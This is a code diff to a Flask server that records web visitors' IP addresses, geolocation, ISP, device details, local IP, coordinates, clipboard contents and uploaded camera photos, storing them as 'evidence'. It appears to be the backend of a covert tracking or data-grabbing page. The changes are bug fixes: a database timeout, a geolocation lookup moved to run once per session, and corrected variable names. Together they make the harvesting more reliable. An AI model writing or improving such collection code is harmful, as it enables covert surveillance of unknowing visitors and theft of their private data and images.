@@ -193,11 +193,10 @@ def save_incremental():
         user_agent = parse(user_agent_string)
         timestamp = datetime.now().isoformat()
 
-        # Get geolocation for client IP
-        geo_info = get_geo_info(ip)
-        
-        # Create a new database connection for this request
-        local_conn = sqlite3.connect(DB_FILE)
+        # Create a new database connection for this request. Use a generous
+        # busy-timeout: the browser fires several incremental saves for one
+        # session in parallel, all writing the same row.
+        local_conn = sqlite3.connect(DB_FILE, timeout=30)
         local_cursor = local_conn.cursor()
         
         # Check if this session already exists in database
@@ -262,7 +261,10 @@ def save_incremental():
                 print(f"[DEBUG] Updated record {record_id} with {data_type}")
         
         else:
-            # Create new record with initial data
+            # Create new record with initial data. Geolocation is only needed
+            # here (once per session), so we avoid the external lookup — and its
+            # rate limit — on the many update calls that follow.
+            geo_info = get_geo_info(ip)
             local_cursor.execute('''
                 INSERT INTO access_log (
                     session_id,
@@ -286,7 +288,7 @@ def save_incremental():
                 request.form.get('timezone', 'Unknown'),
                 request.form.get('language', 'Unknown'),
                 request.form.get('hostname', session_id),  # Use session_id as hostname for tracking
-                public_ip,
+                ip,  # the client's public IP (get_client_ip already resolves it)
                 request.form.get('local_ip', 'Unknown'),
                 request.form.get('clipboard_data', ''),
                 request.form.get('latitude', 'Unknown'),
@@ -347,7 +349,7 @@ def upload_evidence():
     # Get geolocation for client IP
     geo_info = get_geo_info(ip)
     
-    print(f"[DEBUG] Geo info for {geo_ip}: {geo_info}")
+    print(f"[DEBUG] Geo info for {ip}: {geo_info}")
     
     timestamp = datetime.utcnow().isoformat()
     filename = f"photo_{ip.replace('.', '_')}_{datetime.utcnow().strftime('%Y%m%d%H%M%S')}.jpg"
@@ -362,7 +364,7 @@ def upload_evidence():
                       user_agent_string, user_agent.device.family, user_agent.browser.family,
                       user_agent.os.family, geo_info['country'], geo_info['region'], 
                       geo_info['city'], geo_info['isp'], screen_width, screen_height, timezone, language,
-                      hostname, public_ip, local_ip, clipboard_data))
+                      hostname, ip, local_ip, clipboard_data))
     return "Success"
 
 @app.route('/uploads/photos/<filename>')
